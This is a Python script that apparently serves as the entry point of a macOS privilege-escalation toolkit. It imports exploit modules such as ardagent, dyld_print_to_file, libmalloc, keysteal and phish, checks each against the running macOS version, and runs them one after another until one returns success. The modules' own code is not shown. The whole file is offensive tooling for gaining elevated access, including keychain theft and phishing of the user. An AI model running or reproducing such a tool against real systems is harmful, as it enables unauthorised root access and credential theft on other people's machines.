#!/usr/bin/env python
import platform
from distutils.version import LooseVersion

from exploits import (
    ardagent,
    dyld_print_to_file,
    keysteal,
    libmalloc,
    nopass,
    phish,
    piggyback,
    proxifier,
    sera,
)

OS_EXPLOITS = [ardagent, dyld_print_to_file, libmalloc, nopass]
APP_EXPLOITS = [proxifier, sera]
INTERACTION_EXPLOITS = [piggyback, keysteal, phish]

EXPLOITS = OS_EXPLOITS + APP_EXPLOITS + INTERACTION_EXPLOITS

REDC = "\033[91m[-] "
YELLOWC = "\033[93m[!] "
GREENC = "\033[92m[+] "
ENDC = "\033[00m"
NL = "\n"


def main():
    """main function"""
    version = platform.mac_ver()[0]
    print(GREENC + "Trying to escalate privileges on macOS %s..." % version + ENDC)
    for exploit in EXPLOITS:
        if not all(ex in dir(exploit) for ex in ["vulnerable", "run"]):
            continue
        if not exploit.vulnerable(LooseVersion(version)):
            print(NL + YELLOWC + "Skipping %s..." % exploit.__name__ + ENDC)
            continue
        print(NL + YELLOWC + "Trying %s..." % exploit.__name__ + ENDC)
        try:
            result = exploit.run()
        except KeyboardInterrupt:
            continue
        if result:
            print(GREENC + exploit.__name__ + " was successful!" + ENDC)
            return result
        print(NL + REDC + "Failed" + ENDC)
    print(NL + REDC + "All Exploits Unsuccessful" + ENDC)
    return


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExitting...")
        exit(0)
